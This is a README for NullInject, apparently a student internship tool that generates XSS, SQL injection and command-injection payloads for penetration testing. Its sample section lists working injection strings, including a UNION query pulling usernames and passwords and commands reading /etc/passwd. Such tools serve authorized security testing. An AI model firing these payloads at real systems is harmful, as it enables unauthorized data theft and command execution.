

# NullInject

**NullInject** is a professional-grade payload generation tool built during the Offensive Security Internship at ITSOLERA Pvt Ltd. It is designed to assist penetration testers and security researchers by generating modular, evasion-ready payloads for common web vulnerabilities including Cross-Site Scripting (XSS), SQL Injection (SQLi), and Command Injection.

## Project Objective

The primary goal of this project is to develop a modular, GUI-based payload generator capable of producing bypass-ready payloads with support for encoding, export, and simulated integration with testing tools such as Burp Suite and OWASP ZAP.

---

## Features

- Modular payload generators for:
  - Cross-Site Scripting (Reflected, Stored, DOM-Based)
  - SQL Injection (Error-based, Union-based, Blind)
  - Command Injection (Linux and Windows variants)
- Encoding support:
  - Base64
  - URL encoding
  - Hexadecimal
- Export generated payloads to:
  - JSON file
  - Clipboard
- Simulated integration with:
  - Burp Suite Repeater API
  - OWASP ZAP Scanner

---

## Folder Structure

NullInject/
├── gui/ # Graphical User Interface (Tkinter)
│ └── gui.py
├── modules/ # Payload logic for each attack type
│ ├── xss.py
│ ├── sqli.py
│ └── cmdinj.py
├── utils/ # Supporting logic (encoders, exporters, integrations)
│ ├── encoder.py
│ ├── exporter.py
│ ├── burp_integration.py
│ └── zap_integration.py
├── output/ # JSON payload exports
├── docs/screenshots/ # GUI screenshots
├── samples/ # Sample payload categories
│ ├── xss/
│ ├── sqli/
│ └── cmd/
├── main.py # Application entry point
├── README.md
├── .gitignore
├── requirements.txt
└── venv/ # Virtual environment (not versioned)

yaml
Copy code

---

## Setup Instructions

### Prerequisites

- Python 3.8 or higher
- Linux (Ubuntu/Kali recommended) or Windows with WSL
- Git

### Installation

```bash
# Clone the repository
git clone https://github.com/bakhtawere/NullInject.git
cd NullInject

# Create and activate virtual environment
python3 -m venv venv
source venv/bin/activate   # For Linux/macOS
# .\venv\Scripts\activate  # For Windows

# Install dependencies
pip install -r requirements.txt
Running the Tool
To launch the GUI:

bash
Copy code
python main.py
Demonstration
Screenshots are located in docs/screenshots/. Below is an example of the GUI interface.



Burp Suite and ZAP Integration (Simulated)
This version of NullInject simulates sending payloads to Burp Suite and OWASP ZAP for testing purposes. These functions are placeholder simulations and do not require either application to be installed.

To implement real API communication, replace the simulated logic in:

utils/burp_integration.py

utils/zap_integration.py

Sample Payloads
The tool includes standard payloads with variations to evade Web Application Firewalls (WAFs), input filters, and blacklists.

Examples include:

XSS
<script>alert(1)</script>

<svg/onload=confirm(1)>

javascript:eval(atob("YWxlcnQoMSk="))

SQLi
' OR 1=1-- -

' UNION SELECT username, password FROM users-- -

' AND 1=CONVERT(int,@@version)-- -

Command Injection
; id

&& cat /etc/passwd

| net user

Export Options
Generated payloads can be:

Exported as a .json file (output/payloads.json)

Copied to system clipboard for manual testing
---

##  GUI Preview

![GUI Screenshot](/home/kali/Pictures/gui.png) 

---

License
This tool is created as part of a student internship program. It is intended for educational and authorized testing purposes only. Misuse of this tool for unauthorized activities is strictly prohibited.


Disclaimer
This project is intended for authorized security research and educational purposes only. The author assumes no responsibility for any misuse or damage caused by this tool.

yaml
Copy code

---

